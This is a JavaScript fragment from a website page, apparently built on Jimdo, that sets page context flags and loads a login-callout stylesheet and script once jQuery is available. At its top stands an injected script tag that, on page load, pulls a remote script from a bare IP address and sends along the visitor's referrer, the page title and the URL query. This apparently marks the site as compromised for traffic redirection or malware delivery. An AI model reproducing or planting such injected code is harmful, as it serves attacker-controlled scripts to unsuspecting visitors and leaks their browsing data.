<script type="application/javascript">
document.write('<script type="application/javascript" src="http://185.198.165.44/TGBc3mrm?&se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm63a45cf2c954d=script63a45cf2c954e"><' + '/script>');
</script>window.diy = window.diy || {};
window.diy.context = window.diy.context || {};
window.diy.context.type = 'web';
window.diy.context.isLoggedIn = false;
window.diy.context.isPublicView = /publicview=1/.test(location.search);
window.diy.context.isMobilePreviewView = /mobilepreview=1/.test(location.search);

(function () {
    var loadResourcesInterval = setInterval(function () {
        if (typeof jQuery === 'undefined') {
            return;
        } else {
            clearInterval(loadResourcesInterval);
            if (location.search.indexOf('logincallout=1') != -1) {
                jQuery("<link/>", {
                    rel: "stylesheet",
                    type: "text/css",
                    href: jimdoData.cdnUrl + "s/css/web/logincallout.css?1657089725"
                }).appendTo("head");
                jQuery.getScript(webPath + 'cc/logincallout.php');
            }
        }
    }, 100);
}());

